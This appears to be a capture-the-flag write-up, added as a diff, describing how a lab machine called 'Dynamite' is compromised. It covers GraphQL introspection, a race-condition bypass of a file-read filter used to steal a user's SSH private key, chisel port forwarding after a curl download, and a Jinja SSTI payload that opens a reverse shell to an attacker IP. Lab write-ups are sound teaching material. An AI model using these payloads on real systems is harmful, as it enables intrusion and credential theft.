@@ -1,0 +1,217 @@
+---
+title: 'Dynamite Writeup'
+date: '2025-06-10'
+tags: ['Race Condition', 'SSTI', 'LFR', 'GraphQL', 'Linux', 'Hacking Club']
+draft: false
+summary: 'The Dynamite machine is vulnerable to Race condition, SSTI, LFR and more. '
+images: ['/static/images/dynamite-writeup-images/default.png']
+authors: ['default']
+---
+
+## ![Dynamite](/static/images/dynamite-writeup-images/default.png)
+
+## Port Scanning
+
+```bash
+export IP= ...
+nmap -sV -sC -p- -v $IP --min-rate 3000
+```
+
+![dynamite](/static/images/dynamite-writeup-images/image.png)
+
+Only the ports 22 (SSH), 80 (HTTP) and 8080 (HTTP) was found opened.
+
+---
+
+## Enumeration
+
+When we open the aplication, we notice a POST request for the graphql api
+
+![dynamite 1](/static/images/dynamite-writeup-images/image1.png)
+
+Adding the domain in our /etc/hosts config file
+
+```python
+sudo vim /etc/hosts
+```
+
+![dynamite 2](/static/images/dynamite-writeup-images/image2.png)
+
+Now we can access the GraphQL api at port 8080
+
+![dynamite 3](/static/images/dynamite-writeup-images/image3.png)
+
+Usually, the main problem with GraphQL is the Introspection, and we can enumerate everything in the API.
+
+To do so, we just pass the query in the POST request:
+
+```python
+{"query":"{ __schema { types { name kind description fields { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }"}
+```
+
+I used **curl** in this case:
+
+```python
+curl -s -X POST http://dynamite.hc:8080/graphql \
+  -H 'Content-Type: application/json' \
+  --data-raw '{"query":"{ __schema { types { name kind description fields { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }"}' | jq > results.json
+
+```
+
+![dynamite 4](/static/images/dynamite-writeup-images/image4.png)
+
+Now we have a problem, we need to filter the results, because its a lot of data and not everything is usefull.
+
+```python
+cat results.json | jq '.data.__schema.types[]
+  | select(.fields != null)
+  | {type: .name, fields: [.fields[] | {field: .name, args: [.args[]?.name]}]}'
+
+```
+
+![dynamite 5](/static/images/dynamite-writeup-images/image5.png)
+
+Checking the results, we can see there is a query named `file`.
+
+LFR? 😋
+
+![dynamite 6](/static/images/dynamite-writeup-images/image6.png)
+
+After testing, we see some kind of protection blocking our Local File Read.
+
+When i checked the **robots.txt** file, i noticed the file **main.go**
+
+![dynamite 7](/static/images/dynamite-writeup-images/image7.png)
+
+The **main.go** file is the application source code.
+
+![dynamite 8](/static/images/dynamite-writeup-images/image8.png)
+
+I asked GPT to fix the lines for me.
+
+Analysing the code, we can see the regex blocking our LFR:
+
+![dynamite 9](/static/images/dynamite-writeup-images/image9.png)
+
+However, since is a go application, we can test for race condition, recently the channel LiveOverFlow posted about this Go vulnerability.
+
+https://youtu.be/wVknDjTgQoo
+
+This application in specifically have an sleep in it, which make the things easier for us.
+
+Basically, we need to pass two requests.
+
+Request 1:
+
+We send the actual file that we want to read.
+
+![dynamite 10](/static/images/dynamite-writeup-images/image10.png)
+
+Right after send the first request, we send another one, since we can read the **main.go** file, i read it.
+
+Request 2
+
+![dynamite 11](/static/images/dynamite-writeup-images/image11.png)
+
+And we bypassed the filter with success 😋
+
+![dynamite 12](/static/images/dynamite-writeup-images/image12.png)
+
+---
+
+## Foot Hold
+
+Reading the /etc/passwd file, we noticed an user named **dyna**. It was possible get the ssh key.
+
+```python
+query={file(path:"/home/dyna/.ssh/id_rsa"){content}}
+```
+
+![dynamite 13](/static/images/dynamite-writeup-images/image13.png)
+
+With the id_rsa key in hands, we had our initial access
+
+```python
+chmod 600 id_rsa
+ssh dyna@172.16.12.67 -i id_rsa
+```
+
+![dynamite 14](/static/images/dynamite-writeup-images/image14.png)
+
+---
+
+## Privillege Escalation
+
+Internal application running at port 5000
+
+```python
+ss -tulnp
+```
+
+![dynamite 15](/static/images/dynamite-writeup-images/image15.png)
+
+I used chisel to port foward the application, so we can access in our machine.
+
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+
+**Attacker Machine**
+
+```python
+python3 -m http.server 80
+```
+
+![dynamite 16](/static/images/dynamite-writeup-images/image16.png)
+
+**Target Machine**
+
+```python
+curl 10.0.31.150/chisel -o /tmp/chisel
+chmod +x /tmp/chisel
+```
+
+![dynamite 17](/static/images/dynamite-writeup-images/image17.png)
+
+Now lets start de chisel server on our machine
+
+```python
+./chisel server -p 9000 --reverse
+```
+
+![dynamite 18](/static/images/dynamite-writeup-images/image18.png)
+
+Then, we set the client to foward the connection on the target machina
+
+```python
+./chisel client 10.0.31.150:9000 R:9023:127.0.0.1:5000
+```
+
+![dynamite 19](/static/images/dynamite-writeup-images/image19.png)
+
+Now we can check the application from our machine
+
+![dynamite 20](/static/images/dynamite-writeup-images/image20.png)
+
+After passing the payload `{{7*7}}`, the application reflects the number 49, confirming a **SSTI (Server Side Template Injection)** vulnerability
+
+![dynamite 21](/static/images/dynamite-writeup-images/image21.png)
+
+It was possible to get an RCE with the SSTI, passing the payload:
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("/bin/bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'").read().zfill(417)}}{%endif%}{% endfor %}
+
+```
+
+![dynamite 22](/static/images/dynamite-writeup-images/image22.png)
+
+```python
+nc -lnvp 1337
+```
+
+![dynamite 23](/static/images/dynamite-writeup-images/image23.png)
+
+---
+
+## Proof
+
+![dynamite 24](/static/images/dynamite-writeup-images/image24.png)
